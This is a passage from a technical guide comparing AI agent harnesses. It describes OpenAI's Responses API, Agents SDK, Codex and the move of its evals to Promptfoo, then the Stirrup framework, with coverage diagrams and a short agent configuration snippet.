<path d="M73.0 111.1 A62 62 0 0 1 84.3 76.3 L112.1 95.9 A28 28 0 0 0 107.0 111.6 Z" fill="#9dbcf0" stroke="#ffffff" stroke-width="1.6"/>
<text x="67.5" y="93.6" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">Cost</text>
<path d="M85.4 74.9 A62 62 0 0 1 115.0 53.3 L126.0 85.5 A28 28 0 0 0 112.6 95.2 Z" fill="#0052CC" stroke="#ffffff" stroke-width="1.6"/>
<text x="93.3" y="58.1" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">Observe</text>
<circle cx="135.0" cy="112.0" r="25" fill="#0052CC"/>
<text x="135.0" y="111.0" font-size="8.5" fill="#ffffff" text-anchor="middle" font-weight="700">Core</text>
<text x="135.0" y="121.0" font-size="8.5" fill="#ffffff" text-anchor="middle" font-weight="700">loop</text>
<rect x="14.0" y="214.0" width="12.0" height="10.0" rx="2" fill="#0052CC" stroke="#0052CC" stroke-width="1"/>
<text x="30.0" y="223.0" font-size="8.5" fill="#44546f" text-anchor="start" font-weight="normal">built in</text>
<rect x="98.0" y="214.0" width="12.0" height="10.0" rx="2" fill="#9dbcf0" stroke="#9dbcf0" stroke-width="1"/>
<text x="114.0" y="223.0" font-size="8.5" fill="#44546f" text-anchor="start" font-weight="normal">partial</text>
<rect x="182.0" y="214.0" width="12.0" height="10.0" rx="2" fill="#ffffff" stroke="#8a96a8" stroke-width="1" stroke-dasharray="4 3"/>
<text x="198.0" y="223.0" font-size="8.5" fill="#44546f" text-anchor="start" font-weight="normal">yours to build</text>
</svg>
</div>
<div class="fig-arch">
<div class="grid-3">
<div class="layer primary"><div class="layer-title">Responses API</div><span class="chip">input and output items</span><span class="chip">hosted tools, remote MCP</span><span class="chip">previous_response_id</span><span class="chip">server-side compaction</span></div>
<div class="layer aws"><div class="layer-title">Agents SDK</div><span class="chip">handoffs</span><span class="chip">guardrails</span><span class="chip">tracing</span><span class="chip">sandbox agents</span></div>
<div class="layer"><div class="layer-title">Codex</div><span class="chip">--sandbox</span><span class="chip">--output-schema</span><span class="chip">--json</span><span class="chip">resume</span><span class="chip">config.toml providers</span></div>
</div>
<div class="v-arrow">↓ traces</div>
<div class="layer success"><div class="layer-title">Evaluation after 30 November 2026</div><span class="chip">Promptfoo config in the repository</span><span class="chip">improvement loop: traces, feedback, evals, HALO, Codex handoff</span></div>
</div>
</div>

The Responses API is the core primitive, because it runs an agent loop behind one API call. A single `POST /v1/responses` accepts a mixed list of input items covering user messages, prior tool outputs, images, and files, a list of tool declarations that can be your own functions or hosted built-ins or hosted MCP tools the API executes without your process in the loop, a `text.format` for structured outputs, and a `previous_response_id` to chain across turns. The response returns output items covering assistant text, function calls, tool results, and reasoning traces, and if it contains function calls your process handles, you send the results on the next request with the previous response ID set.

Two traps apply. The top-level `instructions` field does not carry across chained turns, so what you set on turn one is not reapplied on turn two merely because you passed a previous response ID, and you must resend it every turn. And chaining does not reduce billing, because prior input tokens are re-billed on every chained call, so a long chain costs quadratically without compaction. The API gives you the loop and the hosted tools. It does not give you orchestration primitives, persistent user-editable memory, or scheduling.

Above that sits the Agents SDK, where handoff primitives, guardrails, tracing, and multi-agent flows live. Its September 2026 update added sandbox agents, which run on local Unix, Docker, and hosted providers including Daytona, E2B, and Modal, with remote mounts from S3 and Azure Blob Storage. The older Agent Builder and prompts surfaces shut down on 30 November 2026.

Codex is the local-execution harness, running on your machine, editing your files, and driving your shell. Where the Responses API is a stateless loop and the Agents SDK is orchestration, Codex is the sandbox and permission model around the local machine. It ships flags built for automation, with `--output-schema` returning validated JSON for typed stage verdicts and chaining into CI, `--sandbox` presets mapping to macOS Seatbelt and Linux Landlock profiles with per-turn escalation, `--json` emitting a JSONL event stream another process can consume, `resume` continuing a multi-stage pipeline from an earlier job's state, and model provider entries in `config.toml` fronting OpenAI, Bedrock, or any OpenAI-compatible endpoint. The most important security rule is this: never put an API key in a job-level environment variable when that job also checks out repository code, and split privilege across jobs so the key-holding job cannot see the code and the code-checkout job cannot see the key. The Codex desktop app is a thin surface over the same runtime, sharing configuration, MCP servers, sandbox profiles, and session storage with the CLI while adding approval prompts and computer-use tooling.

Evals on OpenAI are in transition, and the dates matter. OpenAI deprecated its managed Evals platform on 3 June 2026, including the dashboard, the API, and the graders documented for eval workflows. Existing evals become read-only on 31 October 2026, and the platform shuts down on 30 November 2026. The recommended replacement is Promptfoo, an open-source CLI where an eval lives in `promptfooconfig.yaml` in your repository, runs with `promptfoo eval`, opens with `promptfoo view`, and slots into CI. The migration guide covers recreating each eval by hand, so every grader, and especially every model-judged one, needs revalidation before anyone trusts it for regression decisions. The Agents SDK side stays. Its built-in tracing records model calls, tool calls, handoffs, and guardrails. The May 2026 cookbook on agent improvement loops shows the intended shape. Traces collect human and model feedback, and the feedback becomes generated Promptfoo evals. An optimizer called HALO then ranks the next harness changes, and a `codex_handoff.md` file hands them to Codex to implement behind the eval gate. Codex also ships a Promptfoo plugin for building and maintaining these suites.

A representative production build expresses agent logic as Agents SDK graphs, lands low-level model calls on the Responses API, delegates unattended local work to Codex with per-job sandbox presets, and traces everything through the SDK. Each surface owns a concern the other two are wrong for.

KiroCrew unifies API, CLI, and desktop into one substrate because everything is local. OpenAI keeps three surfaces because the cloud loop, the orchestration layer, and the local sandbox are different concerns.

## A.7 Stirrup

Stirrup from Artificial Analysis is a lightweight framework designed as a starting-point template, in Python and as StirrupJS for TypeScript. Its stated philosophy is to work with the model rather than against it, getting out of the way and letting the model choose its own approach the way Claude Code does, while still providing context management, MCP support, and code execution.

```python
agent = Agent(
    client=client, name="my_agent", max_turns=30,
    tools=None,                          # defaults to default_tools()
    finish_tool=None,                    # defaults to SIMPLE_FINISH_TOOL
    context_summarization_cutoff=0.7,
    recover_from_context_overflow=True,
)
```

<div class="diagram fig-split">
<div class="figure-inline">
<svg viewBox="0 0 270 236" xmlns="http://www.w3.org/2000/svg" role="img">
<defs><marker id="wstirrup-g" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#8a96a8"/></marker><marker id="wstirrup-o" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#FF9900"/></marker><marker id="wstirrup-b" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#0052CC"/></marker><marker id="wstirrup-r" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#de350b"/></marker><marker id="wstirrup-gr" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#1e7e34"/></marker><marker id="wstirrup-d" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#232F3E"/></marker></defs>
<text x="135.0" y="12.0" font-size="8.5" fill="#6b7a90" text-anchor="middle" font-weight="700">HARNESS COVERAGE</text>
<path d="M116.7 52.8 A62 62 0 0 1 153.3 52.8 L143.3 85.3 A28 28 0 0 0 126.7 85.3 Z" fill="#0052CC" stroke="#ffffff" stroke-width="1.6"/>
<text x="135.0" y="41.5" font-size="9.5" fill="#44546f" text-anchor="middle" font-weight="normal">Tools</text>
<path d="M155.0 53.3 A62 62 0 0 1 184.6 74.9 L157.4 95.2 A28 28 0 0 0 144.0 85.5 Z" fill="#0052CC" stroke="#ffffff" stroke-width="1.6"/>
<text x="176.7" y="58.1" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">Context</text>
<path d="M185.7 76.3 A62 62 0 0 1 197.0 111.1 L163.0 111.6 A28 28 0 0 0 157.9 95.9 Z" fill="#9dbcf0" stroke="#ffffff" stroke-width="1.6"/>
<text x="202.5" y="93.6" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">Caching</text>
<path d="M197.0 112.9 A62 62 0 0 1 185.7 147.7 L157.9 128.1 A28 28 0 0 0 163.0 112.4 Z" fill="#ffffff" stroke="#8a96a8" stroke-width="1.6" stroke-dasharray="3 2"/>
<text x="202.5" y="137.4" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">Memory</text>
<path d="M184.6 149.1 A62 62 0 0 1 155.0 170.7 L144.0 138.5 A28 28 0 0 0 157.4 128.8 Z" fill="#0052CC" stroke="#ffffff" stroke-width="1.6"/>
<text x="176.7" y="172.9" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">Bounds</text>
<path d="M153.3 171.2 A62 62 0 0 1 116.7 171.2 L126.7 138.7 A28 28 0 0 0 143.3 138.7 Z" fill="#9dbcf0" stroke="#ffffff" stroke-width="1.6"/>
<text x="135.0" y="191.5" font-size="9.5" fill="#44546f" text-anchor="middle" font-weight="normal">Agents</text>
<path d="M115.0 170.7 A62 62 0 0 1 85.4 149.1 L112.6 128.8 A28 28 0 0 0 126.0 138.5 Z" fill="#9dbcf0" stroke="#ffffff" stroke-width="1.6"/>
<text x="93.3" y="172.9" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">Sandbox</text>
<path d="M84.3 147.7 A62 62 0 0 1 73.0 112.9 L107.0 112.4 A28 28 0 0 0 112.1 128.1 Z" fill="#ffffff" stroke="#8a96a8" stroke-width="1.6" stroke-dasharray="3 2"/>
<text x="67.5" y="137.4" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">Evals</text>
<path d="M73.0 111.1 A62 62 0 0 1 84.3 76.3 L112.1 95.9 A28 28 0 0 0 107.0 111.6 Z" fill="#0052CC" stroke="#ffffff" stroke-width="1.6"/>
<text x="67.5" y="93.6" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">Cost</text>
<path d="M85.4 74.9 A62 62 0 0 1 115.0 53.3 L126.0 85.5 A28 28 0 0 0 112.6 95.2 Z" fill="#9dbcf0" stroke="#ffffff" stroke-width="1.6"/>
<text x="93.3" y="58.1" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">Observe</text>
<circle cx="135.0" cy="112.0" r="25" fill="#0052CC"/>
<text x="135.0" y="111.0" font-size="8.5" fill="#ffffff" text-anchor="middle" font-weight="700">Core</text>
<text x="135.0" y="121.0" font-size="8.5" fill="#ffffff" text-anchor="middle" font-weight="700">loop</text>
<rect x="14.0" y="214.0" width="12.0" height="10.0" rx="2" fill="#0052CC" stroke="#0052CC" stroke-width="1"/>
<text x="30.0" y="223.0" font-size="8.5" fill="#44546f" text-anchor="start" font-weight="normal">built in</text>
<rect x="98.0" y="214.0" width="12.0" height="10.0" rx="2" fill="#9dbcf0" stroke="#9dbcf0" stroke-width="1"/>
<text x="114.0" y="223.0" font-size="8.5" fill="#44546f" text-anchor="start" font-weight="normal">partial</text>
<rect x="182.0" y="214.0" width="12.0" height="10.0" rx="2" fill="#ffffff" stroke="#8a96a8" stroke-width="1" stroke-dasharray="4 3"/>
<text x="198.0" y="223.0" font-size="8.5" fill="#44546f" text-anchor="start" font-weight="normal">yours to build</text>
</svg>
</div>
<div class="fig-arch">
<div class="diagram-stack">
<div class="layer"><div class="layer-title">Client</div><span class="chip">ChatCompletionsClient</span><span class="chip">LiteLLMClient</span><span class="chip">your own client</span></div>
<div class="v-arrow">↓</div>
<div class="layer aws"><div class="layer-title">Agent</div><span class="chip">max_turns 30</span><span class="chip">summarize at 0.7</span><span class="chip">overflow recovery</span><span class="chip">finish tool with reason and paths</span></div>
<div class="v-arrow">↓</div>
<div class="layer primary"><div class="layer-title">session()</div><span class="chip">tool lifecycle</span><span class="chip">file upload</span><span class="chip">skills</span><span class="chip">output files</span></div>
<div class="v-arrow">↓</div>
<div class="grid-2">
<div class="layer"><div class="layer-title">Tools</div><span class="chip">code execution: local, Docker, E2B</span><span class="chip">web</span><span class="chip">MCP client</span><span class="chip">custom Tool</span></div>
<div class="layer success"><div class="layer-title">Subagents and metrics</div><span class="chip">agent.to_tool()</span><span class="chip">aggregate_metadata()</span><span class="chip">TokenUsage and timing</span></div>
</div>
</div>
</div>
</div>

The agent loop has a configurable finish tool, and it summarizes at a configurable context fraction with overflow recovery by unwinding turns. Default tools cover local code execution, web search, and fetch. Sessions handle tool lifecycle, file upload, skill loading, and output file saving. Subagents come through `to_tool()` with nesting and file transfer. Clients cover any OpenAI-compatible API and LiteLLM, and a one-method protocol lets you add your own. Every run and every message carries token and timing metadata.

Stirrup ships no evaluation library, which fits its role. Artificial Analysis uses it as the harness inside its own agentic benchmarks. In GDPval-AA, models get shell access and web browsing in a Stirrup loop, and blind pairwise comparisons of their deliverables produce Elo ratings. NVIDIA NeMo Gym wraps it the same way in a `stirrup_agent` for GDPval. What Stirrup gives an eval is clean evidence to grade. The finish tool's `paths` list names the deliverables, `aggregate_metadata` returns token usage and per-tool call counts, and every message carries timing. You bring the tasks, the graders, and the trial runner.

It is the clearest small codebase to learn from, and its message model handles reasoning blocks and provider continuation state more correctly than most large frameworks. Its defaults are documented alongside the reasons for them. Against that, isolation stops at the code-execution backend, which is a local temporary directory by default with Docker and E2B as options. It also has no permission system, no durable execution, no graph orchestration, and a smaller ecosystem. Pick it when you want to read the whole harness in an afternoon, or want a template you will modify rather than a framework you will configure.
